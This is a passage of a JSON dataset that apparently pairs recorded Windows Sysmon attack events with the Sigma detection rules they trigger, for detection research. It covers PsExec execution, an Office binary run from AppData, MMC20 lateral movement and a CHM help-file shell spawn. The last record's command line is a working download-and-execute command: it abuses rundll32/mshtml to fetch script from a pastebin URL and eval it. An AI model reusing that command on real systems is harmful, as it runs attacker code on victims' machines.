    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 1,
    "SystemTime": "2020-12-09T16:52:45.141993Z",
    "Version": 5,
    "OriginalLogfile": "sysmon_privesc_psexec_dwell.evtx-KR8J9ZWY.json",
    "CommandLine": "\"C:\\Windows\\System32\\mspaint.exe\" 췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍췍",
    "Company": "Microsoft Corporation",
    "CurrentDirectory": "C:\\Windows\\system32\\",
    "Description": "Paint",
    "FileVersion": "10.0.17763.1 (WinBuild.160101.0800)",
    "Hashes": "SHA1=8956D4DFF2E321B7308D7FDD8BD32BF47D61F398,MD5=67C68B11E98970966DF59D2FAD6152BF,SHA256=615CFFE98CAD0DB5F7F261CE915F13BBBC22378BB2A80591D38205D5658A8092,IMPHASH=ABBE6AE1A46B5D03FCCC5A2C2F1DF4D0",
    "IntegrityLevel": "System",
    "LogonGuid": "747F3D96-76FA-5FD1-0000-0020E7030000",
    "LogonId": "0x3e7",
    "ParentCommandLine": "C:\\Windows\\PSEXESVC.exe",
    "ParentImage": "C:\\Windows\\PSEXESVC.exe",
    "ParentProcessGuid": "747F3D96-00D9-5FD1-0000-001021855301",
    "ParentProcessId": 16344,
    "Product": "Microsoft® Windows® Operating System",
    "TerminalSessionId": 0,
    "User": "NT AUTHORITY\\SYSTEM",
    "OriginalFileName": "MSPAINT.EXE"
  },
  {
    "Rule level": "high",
    "title": "MS Office Product Spawning Exe in User Dir",
    "sigma_yml": "proc_creation_win_office_spawn_exe_from_users_directory.yml",
    "description": "Detects an executable in the users directory started from Microsoft Word, Excel, Powerpoint, Publisher or Visio",
    "row_id": 30309,
    "Image": "C:\\Users\\IEUser\\AppData\\Roaming\\WINWORD.exe",
    "ProcessGuid": "747F3D96-D8F1-5F8A-0000-00108B4B7300",
    "ProcessId": 3500,
    "UtcTime": "2020-10-17 11:43:45.116",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "MSEDGEWIN10",
    "EventID": 1,
    "EventRecordID": 417083,
    "ThreadID": 4688,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 1,
    "SystemTime": "2020-10-17T11:43:45.120170Z",
    "Version": 5,
    "OriginalLogfile": "sideloading_uacbypass_rundll32_injection_c2.evtx-21VHW1WN.json",
    "CommandLine": "\"C:\\Users\\IEUser\\AppData\\Roaming\\WINWORD.exe\"",
    "Company": "Microsoft Corporation",
    "CurrentDirectory": "C:\\Users\\IEUser\\AppData\\Roaming\\",
    "Description": "Microsoft Office Word",
    "FileVersion": "12.0.4518.1014",
    "Hashes": "SHA1=534A7EA9C67BAB3E8F2D41977BF43D41DFE951CF,MD5=CEAA5817A65E914AA178B28F12359A46,SHA256=6C959CFB001FBB900958441DFD8B262FB33E052342948BAB338775D3E83EF7F7,IMPHASH=46337557842A2A62735BB11EB096B204",
    "IntegrityLevel": "High",
    "LogonGuid": "747F3D96-CA8D-5F8A-0000-0020D1090A00",
    "LogonId": "0xa09d1",
    "ParentCommandLine": "C:\\Users\\IEUser\\AppData\\Roaming\\WINWORD.exe --xStart",
    "ParentImage": "C:\\Users\\IEUser\\AppData\\Roaming\\WINWORD.exe",
    "ParentProcessGuid": "747F3D96-D8E5-5F8A-0000-0010E1BC7200",
    "ParentProcessId": 2920,
    "Product": "2007 Microsoft Office system",
    "TerminalSessionId": 1,
    "User": "MSEDGEWIN10\\IEUser",
    "OriginalFileName": "WinWord.exe"
  },
  {
    "Rule level": "high",
    "title": "MMC20 Lateral Movement",
    "sigma_yml": "proc_creation_win_mmc20_lateral_movement.yml",
    "description": "Detects MMC20.Application Lateral Movement; specifically looks for the spawning of the parent MMC.exe with a command line of \"-Embedding\" as a child of svchost.exe",
    "row_id": 33940,
    "Image": "C:\\Windows\\System32\\mmc.exe",
    "ProcessGuid": "365ABB72-B17F-5CC8-0000-001082A51E00",
    "ProcessId": 1964,
    "UtcTime": "2019-04-30 20:35:11.856",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "IEWIN7",
    "EventID": 1,
    "EventRecordID": 9832,
    "ThreadID": 1664,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 1,
    "SystemTime": "2019-04-30T20:35:11.856089Z",
    "Version": 5,
    "OriginalLogfile": "LM_impacket_docmexec_mmc_sysmon_01.evtx-1QURNOOP.json",
    "CommandLine": "C:\\Windows\\system32\\mmc.exe -Embedding",
    "Company": "Microsoft Corporation",
    "CurrentDirectory": "C:\\Windows\\system32\\",
    "Description": "Microsoft Management Console",
    "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
    "Hashes": "SHA1=98D8C5E38510C6220F42747D15F6FFF75DD59845,MD5=A2A5D487D0C3D55739A0491B6872480D,SHA256=40E2B83F07771D54CE4E45B76A14883D042766FF4E1E7872E482EC91E81E9484,IMPHASH=6D2ED4ADDAC7EBAE62381320D82AC4C1",
    "IntegrityLevel": "High",
    "LogonGuid": "365ABB72-B17F-5CC8-0000-0020C6A31E00",
    "LogonId": "0x1ea3c6",
    "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentProcessGuid": "365ABB72-2586-5CC9-0000-001087700000",
    "ParentProcessId": 612,
    "Product": "Microsoft® Windows® Operating System",
    "TerminalSessionId": 0,
    "User": "IEWIN7\\IEUser"
  },
  {
    "Rule level": "high",
    "title": "HTML Help Shell Spawn",
    "sigma_yml": "proc_creation_win_html_help_spawn.yml",
    "description": "Detects a suspicious child process of a Microsoft HTML Help system when executing compiled HTML files (.chm)",
    "row_id": 32497,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "ProcessGuid": "747F3D96-AE22-5D3A-0000-001004D84E00",
    "ProcessId": 5924,
    "UtcTime": "2019-07-26 07:39:14.853",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "MSEDGEWIN10",
    "EventID": 1,
    "EventRecordID": 4353,
    "ThreadID": 6056,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 1,
    "SystemTime": "2019-07-26T07:39:14.935857Z",
    "Version": 5,
    "OriginalLogfile": "Sysmon_Exec_CompiledHTML.evtx-YRIF28WL.json",
    "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c copy /Y C:\\Windows\\system32\\rundll32.exe %%TEMP%%\\out.exe > nul && %%TEMP%%\\out.exe javascript:\"\\..\\mshtml RunHTMLApplication \";document.write();h=new%%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://pastebin.com/raw/y2CjnRtH\",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im out.exe\",0,true);}",
    "Company": "Microsoft Corporation",
    "CurrentDirectory": "C:\\Users\\IEUser\\Desktop\\",
    "Description": "Windows Command Processor",
    "FileVersion": "10.0.17763.1 (WinBuild.160101.0800)",
    "Hashes": "SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18",
    "IntegrityLevel": "Medium",
    "LogonGuid": "747F3D96-ABD5-5D3A-0000-0020EB990F00",
    "LogonId": "0xf99eb",
    "ParentCommandLine": "\"C:\\Windows\\hh.exe\" C:\\Users\\IEUser\\Desktop\\Fax Record N104F.chm",
    "ParentImage": "C:\\Windows\\hh.exe",
    "ParentProcessGuid": "747F3D96-AE22-5D3A-0000-001096B24E00",
    "ParentProcessId": 1504,
    "Product": "Microsoft® Windows® Operating System",
    "TerminalSessionId": 1,
    "User": "MSEDGEWIN10\\IEUser"
  }
]